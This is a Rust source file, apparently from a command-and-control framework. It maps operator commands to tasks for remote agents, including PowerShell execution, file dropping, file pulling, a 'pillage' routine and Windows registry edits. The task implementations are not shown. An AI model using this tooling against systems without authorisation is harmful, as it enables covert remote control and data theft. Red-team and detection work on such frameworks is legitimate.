use std::{process::exit, sync::Arc};

use axum::extract::State;

use crate::{
    models::AppState,
    net::{Credentials, IsTaskingAgent},
    tasks::task_impl::{
        TaskDispatchError, change_directory, clear_terminal, copy_file, dir_listing, file_dropper,
        kill_agent, kill_process, list_processes, move_file, pillage, pull_file, pwd, reg_add,
        reg_query, remove_agent, run_powershell_command, set_sleep, show_help,
        show_help_for_command, show_server_time, unknown_command,
    },
};

/// Entry point into dispatching tasks on the C2
pub async fn dispatch_task(
    input: String,
    creds: &Credentials,
    agent: IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    // Collect each token individually
    let input_cl = input.clone();
    let tokens: Vec<&str> = input_cl.split_whitespace().collect();
    dispatcher(tokens, input, creds, agent, state).await
}

async fn dispatcher(
    tokens: Vec<&str>,
    raw_input: String,
    creds: &Credentials,
    agent: IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    if tokens.is_empty() {
        return Err(TaskDispatchError::BadTokens(
            "No tokens found in input stream".into(),
        ));
    }

    //
    // Important note on usage:
    //
    // If you want to tokenise input where there could be multiple spaces and other tokens such as
    // ", then in the below rather than passing the pattern (which is an array of single chars), pass
    // the `raw_input` param which contains the unmodified, unflattened, and un-tokenised version of what
    // the user passed in.
    //

    match tokens.as_slice() {
        [""] | [" "] => Ok(()),
        // generic
        ["exit"] | ["quit"] => exit(0),
        ["clear"] | ["cls"] => clear_terminal(&agent, state).await,
        ["servertime"] => show_server_time(creds, state).await,
        ["help"] => show_help(&agent, state).await,
        ["help", arg] => show_help_for_command(&agent, state, arg).await,

        // on &agent
        ["set", "sleep", time] => set_sleep(time, creds, &agent).await,
        ["ps"] => list_processes(creds, &agent).await,
        ["cd", pat @ ..] => change_directory(pat, creds, &agent).await,
        ["pwd"] => pwd(creds, &agent).await,
        ["kill_agent"] => kill_agent(creds, &agent, state).await,
        ["kill", pid] => kill_process(creds, &agent, pid).await,
        ["remove_agent"] => remove_agent(creds, &agent, state).await,
        ["ls"] => dir_listing(creds, &agent).await,
        ["pillage"] => pillage(creds, &agent).await,
        ["run", args @ ..] => run_powershell_command(args, creds, &agent).await,
        ["drop", args @ ..] => file_dropper(args, creds, &agent, state).await,
        ["cp", _pat @ ..] | ["copy", _pat @ ..] => copy_file(raw_input, creds, &agent).await,
        ["mv", _pat @ ..] | ["move", _pat @ ..] => move_file(raw_input, creds, &agent).await,
        ["pull", _pat @ ..] => pull_file(raw_input, creds, &agent).await,
        ["reg", "query", _pat @ ..] => reg_query(raw_input, creds, &agent).await,
        ["reg", "add", _pat @ ..] => reg_add(raw_input, creds, &agent).await,
        _ => unknown_command(),
    }
}
